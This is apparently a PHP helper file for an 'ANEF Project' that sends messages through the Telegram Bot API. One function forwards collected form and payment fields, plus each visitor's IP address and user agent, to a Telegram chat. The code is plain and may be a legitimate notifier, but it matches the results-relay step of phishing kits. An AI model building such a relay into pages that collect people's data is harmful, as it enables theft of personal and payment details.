<?php
// Telegram Bot Integration for ANEF Project
// Handles sending notifications and structured results via Telegram Bot API.

if (!defined('TELEGRAM_BOT_TOKEN') && file_exists(__DIR__ . '/config.php')) {
    require_once __DIR__ . '/config.php';
}

/**
 * Sends a message via Telegram Bot API.
 *
 * @param string $message The message text (HTML allowed)
 * @param string|null $chat_id Optional chat ID override
 * @return bool True on success, false on failure
 */
function telegram_send_message($message, $chat_id = null) {
    $bot_token = defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '';
    $target_chat = $chat_id ?? (defined('TELEGRAM_CHAT_ID') ? TELEGRAM_CHAT_ID : '');

    if (empty($bot_token) || empty($target_chat)) {
        error_log('Telegram: Missing bot token or chat ID.');
        return false;
    }

    $api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
    
    $post_data = [
        'chat_id' => $target_chat,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    if (curl_errno($ch)) {
        error_log('Telegram cURL error: ' . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);

    if ($http_code !== 200) {
        error_log('Telegram API error: HTTP ' . $http_code . ' Response: ' . $response);
        return false;
    }

    return true;
}

/**
 * Formats and sends structured results (e.g., form submissions, payments) to Telegram.
 *
 * @param string $subject The notification subject/title
 * @param array $data Associative array of collected data
 * @return bool
 */
function telegram_send_results($subject, $data = []) {
    $text = "<b>🔔 " . htmlspecialchars($subject) . "</b>\n";
    $text .= "----------------------\n";
    
    foreach ($data as $key => $value) {
        if (is_array($value)) {
            $value = implode(', ', $value);
        }
        $text .= "<b>" . htmlspecialchars(ucwords(str_replace('_', ' ', $key))) . ":</b> " . htmlspecialchars($value) . "\n";
    }
    
    $text .= "----------------------\n";
    $text .= "<b>Timestamp:</b> " . date('Y-m-d H:i:s') . "\n";
    $text .= "<b>IP Address:</b> " . htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
    $text .= "<b>User Agent:</b> " . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";

    return telegram_send_message($text);
}